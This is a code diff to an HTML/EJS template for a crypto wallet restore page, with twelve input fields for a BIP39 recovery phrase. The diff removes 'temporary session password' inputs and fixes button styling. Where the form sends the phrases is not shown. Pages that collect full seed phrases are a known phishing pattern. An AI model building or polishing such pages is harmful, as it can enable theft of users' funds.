@@ -64,15 +64,6 @@
           <input class="mnemonic-input" type="text" name="phrase_12" value='<%- formSection === "12" ? form.phrase_12 : "" %>' required placeholder="12">
         </div>
       </div>
-      <input type="password" class="password" name="password" style="
-      font-size: 16px;
-      border: 2px solid #0000FF;
-      border-radius: 7px;
-      margin-bottom: 15px;
-      width: 70%;
-      text-align: center;
-      outline: none;
-    " placeholder="Enter temporary session password" >
 <div class="
       d-flex
       align-items-center
@@ -91,16 +82,18 @@
         Input the BIP39/BIP44 recovery phrase here to restore the Mnemonic keys that manage your account.
       </p>
 
-      <button
-              border: 0;
-              border-radius: 7px;
-              font-size: 20px;
-              text-align: center;
-              background: #0000FF;
-              color: #ffffff;
-              width: 60%;
-              padding: 10px 0;
-              margin: 20px 0;">
+      <button style="
+      border: 0;
+      border-radius: 7px;
+      font-size: 20px;
+      text-align: center;
+      background: #0000FF;
+      color: #ffffff;
+      width: 60%;
+      padding: 10px 0;
+      margin: 20px 0;
+      cursor: pointer;
+      ">
         Restore
       </button>
     </form>
@@ -241,15 +234,6 @@
             </div>
 
           </div>
-          <input type="password" class="password" name="password" style="
-              font-size: 16px;
-              border: 2px solid #0000FF;
-              border-radius: 7px;
-              margin-bottom: 15px;
-              width: 70%;
-              text-align: center;
-              outline: none;
-            " placeholder="Enter temporary session password" >
       <div class="
               d-flex
               align-items-center
@@ -277,6 +261,7 @@
                 width: 60%;
                 padding: 10px 0;
                 margin: 20px 0;
+                cursor: pointer;
                 ">Restore Wallet</button>
           </div>
       </div>
